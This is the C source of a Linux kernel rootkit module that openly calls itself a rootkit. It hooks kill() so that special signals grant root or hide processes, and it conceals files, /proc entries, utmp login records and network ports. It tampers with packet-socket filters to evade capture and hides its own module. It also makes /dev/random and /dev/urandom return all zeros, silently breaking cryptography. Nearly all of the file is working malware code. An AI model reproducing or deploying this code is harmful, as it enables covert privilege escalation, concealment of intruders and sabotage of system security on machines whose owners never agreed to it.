#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/namei.h>
#include <linux/threads.h>
#include <linux/file.h>
#include <linux/filter.h>
#include <net/sock.h>
#include <net/tcp.h>
#include "hooking/syscall.h"
#include "hooking/func.h"
#include "capabilities/privilege.h"
#include "capabilities/unloading.h"
#include "capabilities/fw_bypass.h"
#include "capabilities/hiding/dentry.h"
#include "capabilities/hiding/module.h"
#include "capabilities/hiding/login.h"
#include "capabilities/hiding/net.h"
#include "state.h"
#include "utils.h"
#include "config.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omri Ben Zikri");
MODULE_DESCRIPTION("Very fun rootkit");
MODULE_VERSION("1.0.0");

// Unused signal numbers which can be used by the rootkit for its own purposes
enum rooti_signal {
    ROOTI_SIG_PROC_LIFETIME_UNBIND = 60,  // request to unbind modules lifetime to the process
    ROOTI_SIG_PROC_LIFETIME_BIND = 61,    // request to bind module lifetime to the process
    ROOTI_SIG_PROC_UNHIDE = 62,           // request to unhide a process
    ROOTI_SIG_PROC_HIDE = 63,             // request to hide a process
    ROOTI_SIG_PROC_PE = 64                // request for privilege escalation
};

struct inode *utmp_inode;
struct inode *proc_inode;

static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
static asmlinkage long (*orig_socket)(const struct pt_regs *regs);
static asmlinkage long (*orig_setsockopt)(const struct pt_regs *regs);

static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
static void (*orig_do_exit)(long code);

static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;

    switch (sig)
    {
    case ROOTI_SIG_PROC_PE:
        return rooti_elevate_privilege();
    case ROOTI_SIG_PROC_HIDE:
        return rooti_pid_list_add(current->pid, &rooti_hidden_pids);
    case ROOTI_SIG_PROC_UNHIDE:
        rooti_pid_list_del(current->pid, &rooti_hidden_pids);
        return 0;
    case ROOTI_SIG_PROC_LIFETIME_BIND:
        return rooti_pid_list_add(current->pid, &rooti_lifetime_bound_pids);
    case ROOTI_SIG_PROC_LIFETIME_UNBIND:
        rooti_pid_list_del(current->pid, &rooti_lifetime_bound_pids);
        return 0;
    default:
        return orig_kill(regs);
    }
}

static asmlinkage long hook_pread64(const struct pt_regs *regs) {
    int fd = regs->di;
    char *user_buf = (char *)regs->si;
    size_t count = regs->dx;
    struct file *file;
    
    size_t nread = orig_pread64(regs);
    if (nread < 0)
        return nread;

    file = fget(fd);
    if (file == NULL) {
        ROOTI_DEBUG("fget() failed");
        return nread;
    }

    if (file->f_inode == utmp_inode)
        rooti_hide_login_entry(user_buf, count);

    fput(file);
    return nread;
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    int fd = regs->di;
    struct linux_dirent64 *user_buf = (struct linux_dirent64 *)regs->si;
    struct file *file;
    int ret;

    int nread = orig_getdents64(regs);
    if (nread < 0)
        return nread;

    file = fget(fd);
    if (file == NULL) {
        ROOTI_DEBUG("fget() failed");
        return nread;
    }

    ret = rooti_hide_dir_entries(user_buf, nread, file->f_inode == proc_inode);

    fput(file);
    return ret;
}

static asmlinkage long hook_socket(const struct pt_regs *regs)
{
    struct file *file;
    struct socket *sock;
    int family = regs->di;
    int fd = orig_socket(regs);
    
    if (fd == -1 || family != AF_PACKET) {
        return fd;
    }

    file = fget(fd);
    if (file == NULL) {
        ROOTI_DEBUG("fget() failed");
        return fd;   
    }
    sock = sock_from_file(file);
    fput(file);
    if (sock == NULL) {
        ROOTI_DEBUG("sock_from_file() failed");
        return fd;
    }

    rooti_overwrite_traffic_filter(sock->sk);
    return fd;
}

static asmlinkage long hook_setsockopt(const struct pt_regs *regs)
{
    int fd = regs->di;
    int optname = regs->dx;
    int optlen = regs->r8;
    sockptr_t optval = USER_SOCKPTR((char __user *)regs->r10);

    struct file *file;
    struct socket *sock;
    struct sock_fprog user_fprog;

    int err = orig_setsockopt(regs);
    if (err)
        return err;

    file = fget(fd);
    if (file == NULL) {
        ROOTI_DEBUG("fget() failed");
        return 0;   
    }
    sock = sock_from_file(file);
    fput(file);
    if (sock == NULL) {
        ROOTI_DEBUG("sock_from_file() failed");
        return 0;
    }

    switch (optname) {
    case SO_ATTACH_FILTER:
        err = copy_bpf_fprog_from_user(&user_fprog, optval, optlen);
        if (err) {
            ROOTI_DEBUG("copy_bpf_fprog_from_user() failed: %d", err);
            return 0;
        }
        
        rooti_inject_traffic_filter(sock->sk, &user_fprog);
        break;

    case SO_DETACH_FILTER:
        rooti_overwrite_traffic_filter(sock->sk);
        break;

    default:
        break;
    }

    return 0;
}

static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *socket = v;

    if (socket != SEQ_START_TOKEN && rooti_should_hide_tcp_port(socket->sk_num))
        return 0;

    return orig_tcp4_seq_show(seq, v);
}

static int hook_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *socket = v;

    if (socket != SEQ_START_TOKEN && rooti_should_hide_udp_port(socket->sk_num))
        return 0;

    return orig_udp4_seq_show(seq, v);
}

// Should really be flagged as noreturn but that raises an objtool warning
static void hook_do_exit(long code)
{
    bool should_unload = rooti_pid_list_contains(current->pid, &rooti_lifetime_bound_pids);
    rooti_pid_list_del(current->pid, &rooti_hidden_pids);
    rooti_pid_list_del(current->pid, &rooti_lifetime_bound_pids);

    if (should_unload)
        rooti_schedule_self_deletion();

    orig_do_exit(code);
}

static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
{
    int ret;
    size_t len = iov_iter_count(iter);
    char *kernel_buf = kzalloc(len, GFP_KERNEL);
    if (kernel_buf == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return -ENOMEM;
    }

    ret = copy_to_iter(kernel_buf, len, iter);
    if (ret == 0) {
        ROOTI_DEBUG("copy_to_iter() failed: %d", ret);
        kfree(kernel_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    return len;
}

/* I am not going for full coverage of every possible system call that should be tampered with
 * in order (because that would take eternity). Instead, this rootkit only messes with system calls
 which are used by the common Linux utils (ls, ps, ss, who...) */
struct rooti_func_hook func_hooks[] = {
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_socket"), hook_socket, &orig_socket),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_setsockopt"), hook_setsockopt, &orig_setsockopt),
    ROOTI_FUNC_HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    ROOTI_FUNC_HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
    ROOTI_FUNC_HOOK("do_exit", hook_do_exit, &orig_do_exit),
    ROOTI_FUNC_HOOK("random_read_iter", hook_random_read_iter, &orig_random_read_iter),
    ROOTI_FUNC_HOOK("urandom_read_iter", hook_random_read_iter, &orig_urandom_read_iter)
};

static int __init rooti_init(void)
{
    int err;
    struct path path;

    ROOTI_DEBUG("init");

    kern_path("/var/run/utmp", LOOKUP_FOLLOW, &path);
    utmp_inode = path.dentry->d_inode;

    kern_path("/proc", LOOKUP_FOLLOW, &path);
    proc_inode = path.dentry->d_inode;

    err = rooti_resolve_kln_addr();
    if (err) {
        ROOTI_DEBUG("rooti_resolve_kln_addr() failed: %d", err);
        return err;
    }

    err = rooti_install_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
    if (err) {
        ROOTI_DEBUG("rooti_install_hooks() failed: %d", err);
        return err;
    }

    rooti_install_fw_bypass_hooks();

#ifndef ROOTI_DEBUG_SHOWME
    err = rooti_hideme();
    if (err)
        return err;
#endif

    return 0;
}

static void __exit rooti_exit(void)
{
    ROOTI_DEBUG("exit");

    rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
    rooti_uninstall_fw_bypass_hooks();
    
    // Release any remaining records
    rooti_pid_list_clear(&rooti_hidden_pids);
    rooti_pid_list_clear(&rooti_lifetime_bound_pids);
}

module_init(rooti_init);
module_exit(rooti_exit);
